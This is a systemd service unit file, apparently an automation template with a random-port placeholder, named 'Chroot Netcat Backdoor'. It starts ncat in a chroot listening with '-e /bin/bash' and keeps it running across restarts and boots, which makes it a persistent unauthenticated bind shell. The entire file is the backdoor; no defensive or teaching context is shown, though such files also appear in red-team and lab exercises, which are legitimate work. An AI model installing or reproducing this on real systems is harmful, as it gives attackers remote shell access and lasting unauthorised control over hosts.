[Unit]
Description=Chroot Netcat Backdoor
After=network.target

[Service]
ExecStart=/usr/sbin/chroot /opt/chroot ncat -l -p {{ random_port }} -e /bin/bash -k
ExecReload=/bin/kill -HUP $MAINPID
KillMode=process
WorkingDirectory=/tmp/
Restart=always

[Install]
WantedBy=multi-user.target
